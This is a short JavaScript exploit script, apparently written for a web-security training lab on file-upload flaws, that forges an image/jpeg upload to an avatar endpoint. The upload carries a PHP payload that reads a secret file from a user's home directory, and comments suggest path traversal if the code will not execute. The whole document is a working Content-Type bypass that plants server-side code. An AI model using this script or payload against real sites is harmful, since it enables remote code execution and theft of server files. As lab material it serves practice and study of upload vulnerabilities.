const typeYouWant = `image/jpeg`;
const payload = `<?php echo file_get_contents('/home/carlos/secret'); ?>`;
// sometimes using path traversal could help if it wont execute
const name="script.php";

const csrfToken="getThisTOken probably need to this parameter asswell";
const path = "/my-account/avatar";

const blob = new Blob([payload], { type: typeYouWant });
const file = new File([blob], name, { type: typeYouWant });

// The form data maybe needs to be changed to whatever parameters are neded
const formData = new FormData();
formData.append("avatar", file);
formData.append("user", "wiener");
formData.append("csrf", csrfToken);

const options = {
    method: "POST",
    body: formData
};
fetch(path, options)
    .then(response => response.text())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
